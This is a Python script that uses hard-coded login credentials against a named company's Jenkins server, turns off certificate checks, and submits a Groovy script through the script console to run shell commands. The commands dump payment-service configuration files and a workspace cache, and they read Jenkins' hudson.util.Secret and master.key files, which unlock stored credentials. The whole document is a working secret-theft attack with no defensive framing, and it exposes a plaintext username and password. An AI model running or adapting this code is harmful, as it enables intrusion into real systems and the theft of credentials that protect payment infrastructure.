import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

GROOVY_SCRIPT = '''
def run(cmd) {
    def proc = ["bash", "-c", cmd].execute()
    proc.waitFor()
    return proc.text
}

println "========== T1PAGOS-API-CONFIG ARCHIVES (latest build) =========="
def t1files = run("find /var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_t1pagos-api-config -path '*/archive*' -type f 2>/dev/null | sort | tail -20")
println t1files

println "========== T1PAGOS CONFIG CONTENTS =========="
def t1confs = run("find /var/jenkins_home/jobs/cs_new_front/jobs/cs_new_pipe_build_t1pagos-api-config -path '*/archive*' -type f \\\\( -name '*.properties' -o -name '*.env' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' -o -name '*.xml' \\\\) 2>/dev/null | tail -10")
t1confs.trim().split("\\n").each { f ->
    if (f.trim()) {
        println "\\n=== " + f.trim() + " ==="
        def content = run("cat '" + f.trim() + "' 2>/dev/null | head -80")
        println content
    }
}

println "========== SEARS T1PAGOS CONFIG =========="
def sefiles = run("find /var/jenkins_home/jobs/se_new_front/jobs/se_new_pipe_build_t1pagos-api-config -path '*/archive*' -type f \\\\( -name '*.properties' -o -name '*.env' -o -name '*.yml' \\\\) 2>/dev/null | tail -5")
sefiles.trim().split("\\n").each { f ->
    if (f.trim()) {
        println "\\n=== " + f.trim() + " ==="
        def content = run("cat '" + f.trim() + "' 2>/dev/null | head -80")
        println content
    }
}

println "========== CAJA-PAGOS WORKSPACE =========="
def cajaf = run("cat /var/jenkins_home/workspace/cs_msa_front/cs_msa_build_caja-pagos-api-deploy2dev/cache.properties 2>/dev/null")
println cajaf

println "========== HUDSON.UTIL.SECRET (base64) =========="
def secret = run("base64 /var/jenkins_home/secrets/hudson.util.Secret 2>/dev/null")
println secret

println "========== MASTER.KEY =========="
def mk = run("cat /var/jenkins_home/secrets/master.key 2>/dev/null")
println mk
'''

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx)
)

req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
r = opener.open(req, timeout=15)
crumb = json.loads(r.read().decode())

data = urllib.parse.urlencode({'script': GROOVY_SCRIPT}).encode()
req2 = urllib.request.Request(BASE + '/scriptText', data=data,
    headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']})
r2 = opener.open(req2, timeout=120)
output = r2.read().decode()
print(f"[+] Output ({len(output)} bytes):\n")
print(output)
